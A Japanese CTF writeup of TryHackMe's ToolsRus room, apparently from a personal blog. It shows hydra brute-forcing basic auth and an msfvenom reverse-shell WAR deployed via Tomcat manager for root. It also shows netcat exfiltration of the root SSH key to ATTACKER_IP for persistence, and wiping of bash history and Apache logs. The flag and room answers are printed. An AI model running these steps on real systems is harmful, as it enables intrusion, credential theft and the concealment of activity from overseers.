---
title: "ToolsRus Writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "TryHackMeのToolsRusルームで、脆弱なTomcat managerに悪意のあるWARファイルをアップロードしてリバースシェルを取得し、SSHキーで永続化する。"
---

## セットアップ

まずはTryHackMeのVPNサーバーに接続する必要がある。これに関する詳細は[Access](https://tryhackme.com/access)ページを確認してほしい。

サーバーへの接続には`openvpn`を使う。コマンドはこちら：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## 偵察（Reconnaissance）
サクッとポートスキャンと情報収集の時間だ（`rustscan`の作者にマジで感謝）：
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1234/tcp open  hotline syn-ack
8009/tcp open  ajp13   syn-ack


$ rustscan -b 4500 -a TARGET_IP -p 22,80,1234,8009 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ディレクトリの列挙をいくつか：
```shell-session
$ gobuster dir -t 64 -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt 
$ cat gobuster_common.txt       
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/guidelines           (Status: 301) [Size: 319] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
```

 > What directory can you find, that begins with a "g"?
 > 
 > Answer: `guidelines`
 
`/guidelines/`ディレクトリにアクセスすると、`Hey bob, did you update that TomCat server?`というテキストだけが表示されている。

> Whose name can you find from this directory?
> 
> Answer: `bob`


さらに、`protected`ディレクトリにリクエストを送ると認証ポップアップが表示される...
> What directory has basic authentication?
> 
> Answer: `protected`

hydraを使ってブルートフォースしてみよう :)
```shell-session
$ hydra -l bob -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f TARGET_IP http-get /protected
...
...
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
```

> What is bob's password to the protected part of the website?
> 
> Answer: `bubbles`

`protected`ページにログインすると、次のようなページが表示される：
![](/assets/img/writeup_assets/toolsrus/protected_page_moved.png)

先ほどのポートスキャンで分かったとおり、ポート**1234**で_Apache Tomcat server_が稼働している。`http://TARGET_IP:1234/manager/`にリクエストして、そこにあるポータルへのログインを試してみよう。見慣れた認証画面が表示されるはずだ。認証情報として`bob:bubbles`を使うと、サーバーパネルへのアクセス権が手に入る！

> What other port that serves a webs service is open on the machine?
> 
> Answer: `1234`



Tomcatサーバーのバージョン番号は、`manager`ページの一番下に記載されている...
> Going to the service running on that port, what is the name and version of the software?
> (Answer format: Full_name_of_service/Version)
> 
> Answer: `Apache Tomcat/7.0.88`

Tomcat managerのページにはドキュメントファイルが合計5つ記載されているので、まだ`nikto`を使う必要はない（ぶっちゃけ使うのがちょっとややこしいし）：
> How many documentation files did ~~Nikto~~ you identify?
> 
> Answer: `5`


> What is the server version (run the scan against port 80)?
> 
> Answer: `Apache/2.4.18`


> What version of Apache-Coyote is this service using?
> 
> Answer: `1.1`


バージョン番号などの情報がひと通り揃ったところで、ターゲットマシンへアクセスするためにどのエクスプロイトが使えるか見ていこう：

## アクセス権の奪取
さて... ルームの指示通りに進めると、このセクションは通常_2_つのパートに分かれるが、`manager`ページからファイルをデプロイできるため、簡単にリバースシェルを取得できる（この先を見れば分かる通り、rootシェルだ！）。まずは適切なペイロードの生成から始めよう：
```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > reverse.war
```

`manager`ページからアップロードできる形式に合わせて、ペイロードとして`WAR`ファイルを生成する：
![](/assets/img/writeup_assets/toolsrus/war_file_upload.png)

ファイルがデプロイされたら、次のように自分のマシンの指定ポート（今回は4444）でリスナーを立ち上げる：
```shell-session
$ nc -nvlp 4444
```

ここで`http://TARGET_IP:1234/reverse/`というURLにリクエストを送ると、netcatリスナーに接続が届くので、シェルの安定化に進むことができる：
```shell-session
$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44662

python -c "import pty; pty.spawn('/bin/bash')"
root@ip-TARGET_IP:/# ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444

export TERM=xterm-256-color
root@ip-TARGET_IP:/# whoami
root

root@ip-TARGET_IP:/# ls /root
flag.txt  snap

root@ip-TARGET_IP:/# cat /root/flag.txt 
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

***!!ボーナスステップ!!***

さて、rootのリバースシェルを手に入れたとはいえ、後でこのマシンを再度攻略する予定があるなら、毎回リバースシェルをアップロードして安定化させるのは面倒だ。そこで、永続化のためにSSH秘密鍵を取得し、アップロードした`/reverse.war`ファイルをクリーンアップしておこう：
```shell-session

## On our machine:
$ nc -nvlp 8888 > toysrus_id_rsa

## On target machine;
root@ip-TARGET_IP:/# ssh-keygen
## Empty passphrases...
root@ip-TARGET_IP:/# nc ATTACKER_IP 8888 -w 3 < /root/.ssh/id_rsa
```

ナイス！これで`ssh`による永続的なアクセスが確保できたので、終了する前にいくつかお掃除をしておこう...
```shell-session
root@ip-TARGET_IP:/# echo "" > /root/.bash_history 
root@ip-TARGET_IP:/# rm /usr/local/tomcat7/webapps/reverse.war 
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/webapps/reverse/
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/work/Catalina/localhost/reverse
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/access.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/error.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/other_vhosts_access.log 

## Just for good measure...
root@ip-TARGET_IP:/# echo "" > /root/.bash_history
```

これにて完了！

> What text is in the file `/root/flag.txt`?
> 
> Answer:  `ff1fc4a81affcc7688cf89ae7dc6e0e1`

## まとめ
もしこのWriteupが役に立ったら、ぜひGitHub（https://github.com/NovusEdge）のフォローやリポジトリ（https://github.com/NovusEdge/thm-writeups）へのスターをお願いします！


- ルーム: [ToolsRus](https://tryhackme.com/room/toolsrus)
